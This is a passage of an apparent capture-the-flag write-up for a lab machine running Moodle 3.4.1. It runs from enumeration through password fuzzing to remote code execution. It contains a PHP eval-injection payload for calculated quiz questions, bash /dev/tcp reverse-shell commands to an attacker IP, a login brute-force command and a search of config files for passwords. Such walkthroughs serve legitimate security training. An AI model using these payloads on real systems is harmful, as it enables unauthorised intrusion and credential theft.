stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Discovering Routes and Resources Using <code>dirsearch</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">dirsearch <span class="token parameter variable">-u</span> http://10.10.10.153/ --exclude-status<span class="token operator">=</span><span class="token number">403,404</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107143047.png" src="img/pasted-image-20251107143047.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107143047.png" src="img/pasted-image-20251107143047.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Many routes and resources were found, but one of them, <code>/moodle</code>, drew attention. This path suggests it might contain a <code>Moodle CMS</code>, which is well known to be vulnerable to authenticated code injection in older versions.</p></div><div class="el-p"><p dir="auto">When this route was accessed, an error occurred because the browser could not resolve the address. This happened because the machine uses virtual hosting and the <code>vhost</code> name was not included in the local <code>/etc/hosts</code> file, so it will be added next.</p></div><div class="el-h2"><h2 data-heading="Virtual Hosting" dir="auto" class="heading" id="Virtual_Hosting_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Virtual Hosting</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107143133.png" src="img/pasted-image-20251107143133.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107143133.png" src="img/pasted-image-20251107143133.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once added, the website should successfully resolve the address and display the content.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107200930.png" src="img/pasted-image-20251107200930.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107200930.png" src="img/pasted-image-20251107200930.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The website indeed displayed content, and from its appearance it was a <code>Moodle CMS</code>. Besides, the name of a teacher was disclosed; this name could be used to attempt to log into the website as him.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Login Attempt Using Common Credentials (Failed)" dir="auto" class="heading" id="TCP_Port_80_Login_Attempt_Using_Common_Credentials_(Failed)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Login Attempt Using Common Credentials (Failed)</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107201023.png" src="img/pasted-image-20251107201023.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107201023.png" src="img/pasted-image-20251107201023.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107201036.png" src="img/pasted-image-20251107201036.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107201036.png" src="img/pasted-image-20251107201036.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The login attempt was unsuccessful. Common credentials such as <code>admin:admin</code> or <code>root:root</code> could be tried, but instead, a Moodle enumeration will be performed using a <code>Git</code> tool called <code>moodlescan</code> to discover the version and then search for vulnerabilities that could allow exploitation, such as <code>SQLi</code>, to obtain valid credentials.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Moodle Version Discovery Using `moodlescan`" dir="auto" class="heading" id="TCP_Port_80_Moodle_Version_Discovery_Using_`moodlescan`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Moodle Version Discovery Using <code>moodlescan</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">git</span> clone https://github.com/inc0d3/moodlescan
python3 moodlescan.py <span class="token parameter variable">-u</span> http://teacher.htb/moodle
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107202911.png" src="img/pasted-image-20251107202911.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107202911.png" src="img/pasted-image-20251107202911.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The tool did not report any information beyond the <code>Moodle</code> version, but this was enough to continue the search for vulnerabilities using tools such as <code>searchsploit</code>.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Identifying Vulnerabilities in Moodle v3.4.1 Using `searchsploit`" dir="auto" class="heading" id="TCP_Port_80_Identifying_Vulnerabilities_in_Moodle_v3.4.1_Using_`searchsploit`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Identifying Vulnerabilities in Moodle v3.4.1 Using <code>searchsploit</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">searchsploit Moodle <span class="token number">3.4</span>.1
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107201111.png" src="img/pasted-image-20251107201111.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107201111.png" src="img/pasted-image-20251107201111.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">When the search was conducted, one finding was reported, indicating an <code>Remote Code Execution</code> vulnerability for this version. Next, the associated exploit will be inspected.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">searchsploit <span class="token parameter variable">-m</span> php/webapps/46551.php
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107203045.png" src="img/pasted-image-20251107203045.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107203045.png" src="img/pasted-image-20251107203045.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The exploit details indicate that the exploitation only works with a <code>teacher-role</code> user. Since the teacher user credentials have not been obtained yet and there is no known vulnerability to acquire them, further web enumeration will be performed starting from the main website <code>teacher.htb/</code>. For example, the <code>/images</code> path will be downloaded, and then a local search within this path, filtering for the words <code>pass</code>, <code>password</code>, and <code>giovanni</code>, will be performed.</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Information Leakage on `teacher.htb/images` Path – Partial Password Discovered" dir="auto" class="heading" id="TCP_Port_80_Information_Leakage_on_`teacher.htb/images`_Path_–_Partial_Password_Discovered_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Information Leakage on <code>teacher.htb/images</code> Path – Partial Password Discovered</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107204801.png" src="img/pasted-image-20251107204801.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107204801.png" src="img/pasted-image-20251107204801.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The enumeration reported an important finding in the <code>/teacher.htb/images/5.png</code> image. This image contained a message in which the user <code>giovanni</code> mentioned that he had forgotten the last character of his password, which is <code>Th4C00lTheacha</code>. Knowing this, the initial exploitation vector to gain access to his session is clear. A <code>web fuzzing</code> process, iterating over possible last characters to discover his complete password, will be performed.</p></div><div class="el-h1"><h1 data-heading="Exploitation" dir="auto" class="heading" id="Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Exploitation</h1></div><div class="el-h2"><h2 data-heading="TCP Port 80: Web Fuzzing to Discover the Last Character of a Teacher-Role User’s Moodle Password Using `wfuzz`" dir="auto" class="heading" id="TCP_Port_80_Web_Fuzzing_to_Discover_the_Last_Character_of_a_Teacher-Role_User’s_Moodle_Password_Using_`wfuzz`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Web Fuzzing to Discover the Last Character of a Teacher-Role User’s Moodle Password Using <code>wfuzz</code></h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107205331.png" src="img/pasted-image-20251107205331.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107205331.png" src="img/pasted-image-20251107205331.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To begin the <code>web fuzzing</code>, it was first necessary to determine the required data for the <code>POST HTTP request</code>. For this, the login request was inspected using the <code>web inspector</code>, and the data was successfully obtained. Next, a dictionary containing all possible characters will be created to perform the <code>fuzzing</code> by iterating over them.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">32</span><span class="token punctuation">..</span><span class="token number">126</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token builtin class-name">printf</span> <span class="token string">"<span class="token entity" title="\\">\\</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span> <span class="token string">'%03o'</span> <span class="token string">"<span class="token variable">$i</span>"</span><span class="token variable">)</span></span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">&gt;</span> diccionario.txt
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107205536.png" src="img/pasted-image-20251107205536.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107205536.png" src="img/pasted-image-20251107205536.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The dictionary was created using a <code>Bash</code> loop that iterates over the decimal values from 32 to 126, which correspond to all printable <code>ASCII</code> characters. For each value, <code>printf '%03o' "$i"</code> converts the decimal number to its three-digit octal representation, and <code>printf "\\..."</code> prints the corresponding <code>ASCII</code> character. Each character is output on a separate line and saved to <code>diccionario.txt</code>. This way, the file contains all printable characters needed for <code>fuzzing</code>. Finally, the <code>web fuzzing</code> will be performed as follows:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">wfuzz <span class="token parameter variable">-u</span> <span class="token string">'http://teacher.htb/moodle/login/index.php'</span> <span class="token parameter variable">-d</span> <span class="token string">'anchor=&amp;username=giovanni&amp;password=Th4C00lTheachaFUZZ'</span> <span class="token parameter variable">-w</span> diccionario.txt <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">--hh</span><span class="token operator">=</span><span class="token number">439</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107205804.png" src="img/pasted-image-20251107205804.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107205804.png" src="img/pasted-image-20251107205804.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>web fuzzing</code> concluded and reported a different result for the <code>#</code> character, indicating that the complete password is <code>Th4C00lTheacha#</code>. Finally, these credentials will be used to log into the <code>Moodle CMS</code> as the <code>giovanni</code> teacher user.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107205851.png" src="img/pasted-image-20251107205851.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107205851.png" src="img/pasted-image-20251107205851.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251109191501.png" src="img/pasted-image-20251109191501.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251109191501.png" src="img/pasted-image-20251109191501.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The credentials worked successfully, and the <code>giovanni</code> session was obtained. Once inside the <code>Moodle CMS</code> as a <code>teacher-role user</code>, the previously discovered exploit can be used to perform the exploitation and obtain an <code>RCE</code>. Let’s see it:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Moodle v3.4.1 Exploitation – Remote Command Execution via Automated Exploit" dir="auto" class="heading" id="TCP_Port_80_Moodle_v3.4.1_Exploitation_–_Remote_Command_Execution_via_Automated_Exploit_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Moodle v3.4.1 Exploitation – Remote Command Execution via Automated Exploit</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107210223.png" src="img/pasted-image-20251107210223.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107210223.png" src="img/pasted-image-20251107210223.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>exploit</code> itself includes instructions within its code on how it should be executed. When reviewing the required <code>parameters</code>, one <code>parameter</code> was missing: the <code>course ID</code>. To obtain it, the following step was performed:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107210324.png" src="img/pasted-image-20251107210324.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107210324.png" src="img/pasted-image-20251107210324.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">By accessing Giovanni’s profile and hovering over the Algebra course, the <code>course ID</code> was discovered. Finally, the exploitation can be performed:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">php rce.php <span class="token assign-left variable">url</span><span class="token operator">=</span>http://teacher.htb/moodle <span class="token assign-left variable">user</span><span class="token operator">=</span>giovanni <span class="token assign-left variable">pass</span><span class="token operator">=</span><span class="token string">'Th4C00lTheacha#'</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">10.10</span>.16.6 <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token assign-left variable">course</span><span class="token operator">=</span><span class="token number">2</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107211129.png" src="img/pasted-image-20251107211129.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107211129.png" src="img/pasted-image-20251107211129.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The exploit worked, and a <code>reverse shel</code>l connection was successfully established, allowing the <code>post-exploitation</code> stage to begin. However, before starting system enumeration, another exploitation method, this time performed manually, will be carried out:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Manual Alternative Moodle v3.4.1 Exploitation Method – Code Injection (Abusing Math Formulas in the Quiz Component)" dir="auto" class="heading" id="TCP_Port_80_Manual_Alternative_Moodle_v3.4.1_Exploitation_Method_–_Code_Injection_(Abusing_Math_Formulas_in_the_Quiz_Component)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Manual Alternative Moodle v3.4.1 Exploitation Method – Code Injection (Abusing Math Formulas in the Quiz Component)</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231528.png" src="img/pasted-image-20251107231528.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231528.png" src="img/pasted-image-20251107231528.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">This manual exploitation could be performed by analyzing the code of the previous <code>exploit</code>, but to obtain detailed information about what the exploitation consists of, this web page was found: <a data-tooltip-position="top" aria-label="https://www.sonarsource.com/blog/moodle-remote-code-execution/" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.sonarsource.com/blog/moodle-remote-code-execution/" target="_self">Link</a>. In short, the vulnerability affects <code>Moodle</code> versions earlier than <code>3.5.0</code> and allows an attacker with a <code>teacher-role use</code>r to execute arbitrary <code>PHP</code> code on the server. It abuses the calculated question feature in the <code>Quiz component</code>, where teachers can enter mathematical formulas that are evaluated using the <code>PHP eval() function</code>. Moodle’s built-in validator attempts to block malicious code, but placeholders in formulas (e.g., <code>{x}</code>) can be nested and manipulated to bypass this check. By crafting a formula with carefully nested placeholders and using <code>PHP</code> comments, the attacker can inject code that reaches <code>eval()</code>, ultimately enabling remote command execution. Once the exploitation mechanism is understood, the full process is demonstrated below:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231606.png" src="img/pasted-image-20251107231606.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231606.png" src="img/pasted-image-20251107231606.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, the Algebra course was selected. Then, the <code>Settings</code> menu was opened, and the <code>Edit</code> option was enabled. Finally, the option <code>Add an activity or resource</code> was clicked, and the <code>Quiz</code> component was selected.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231630.png" src="img/pasted-image-20251107231630.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231630.png" src="img/pasted-image-20251107231630.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231644.png" src="img/pasted-image-20251107231644.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231644.png" src="img/pasted-image-20251107231644.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once inside the <code>Quiz</code> component creation page, only a name was provided to create it, and then the <code>Save and display</code> option was clicked.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231710.png" src="img/pasted-image-20251107231710.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231710.png" src="img/pasted-image-20251107231710.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once the previous option was clicked, the web interface displayed another option to edit the quiz. This allows questions to be added to the <code>quiz</code>, where the <code>payload</code> will be inserted:</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231747.png" src="img/pasted-image-20251107231747.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231747.png" src="img/pasted-image-20251107231747.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">At this point, there was an <code>Add</code> option that allows creating a new question, and this option was clicked.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231810.png" src="img/pasted-image-20251107231810.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231810.png" src="img/pasted-image-20251107231810.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The type of question that will be abused to include the payload is the <code>calculated</code> question, so it was added.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231842.png" src="img/pasted-image-20251107231842.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231842.png" src="img/pasted-image-20251107231842.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Once inside the question creation page, a name and the text of the question must be provided to create it.</p></div><div class="el-pre"><pre class="language-php"><code data-line="0" class="language-php is-loaded"><span class="token comment">/*{a*/</span><span class="token string backtick-quoted-string">`$_GET[0]`</span><span class="token punctuation">;</span><span class="token comment">//{x}}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107231927.png" src="img/pasted-image-20251107231927.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107231927.png" src="img/pasted-image-20251107231927.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Here comes the most important step: the payload must be entered into the <code>Answer 1 Formula</code> field, and a grade for the question must also be specified. After this, the <code>Save changes and continue editing</code> option can be clicked.</p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107232246.png" src="img/pasted-image-20251107232246.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107232246.png" src="img/pasted-image-20251107232246.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">On this page, there is nothing to configure, so we proceed to the next page, where the <code>payload</code> to obtain a <code>reverse shell</code> will be finally executed.</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">python3 <span class="token parameter variable">-c</span> <span class="token string">'import sys,urllib.parse as u; print(u.quote(sys.argv[1]))'</span> <span class="token string">'bash -c "bash -i &amp;&gt; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1"'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107234808.png" src="img/pasted-image-20251107234808.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107234808.png" src="img/pasted-image-20251107234808.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107234927.png" src="img/pasted-image-20251107234927.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107234927.png" src="img/pasted-image-20251107234927.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">To avoid issues with the <code>payload</code> format, it was <code>URL-encoded</code> using <code>Python</code>, and a listener was prepared. It will then be executed as follows:</p></div><div class="el-pre"><pre class="language-python"><code data-line="0" class="language-python is-loaded">Payload <span class="token operator">-</span><span class="token operator">&gt;</span> bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>c<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>22bash<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>i<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">10.10</span><span class="token number">.16</span><span class="token number">.6</span><span class="token operator">/</span><span class="token number">4444</span><span class="token operator">%</span><span class="token number">200</span><span class="token operator">%</span>3E<span class="token operator">%</span><span class="token number">261</span><span class="token operator">%</span><span class="token number">22</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107234750.png" src="img/pasted-image-20251107234750.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107234750.png" src="img/pasted-image-20251107234750.png" target="_self"></span></p></div><div class="el-h2"><h2 data-heading="Initial Access" dir="auto" class="heading" id="Initial_Access_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Initial Access</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251107234900.png" src="img/pasted-image-20251107234900.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251107234900.png" src="img/pasted-image-20251107234900.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>payload</code> finally worked, and the <code>reverse shell</code> was successfully established. At this point, the <code>post-exploitation</code> stage will begin, during which the system will be enumerated to pivot between users and eventually escalate privileges to reach the <code>root</code> account.</p></div><div class="el-h1"><h1 data-heading="Post-Exploitation" dir="auto" class="heading" id="Post-Exploitation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Post-Exploitation</h1></div><div class="el-h2"><h2 data-heading="Information Leakage in `config.php` File – Database Password Discovered" dir="auto" class="heading" id="Information_Leakage_in_`config.php`_File_–_Database_Password_Discovered_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Leakage in <code>config.php</code> File – Database Password Discovered</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> config.php <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null <span class="token parameter variable">-exec</span> <span class="token function">grep</span> <span class="token parameter variable">-iE</span> <span class="token string">'password|dbpass|dbpassword|pwd'</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> + <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
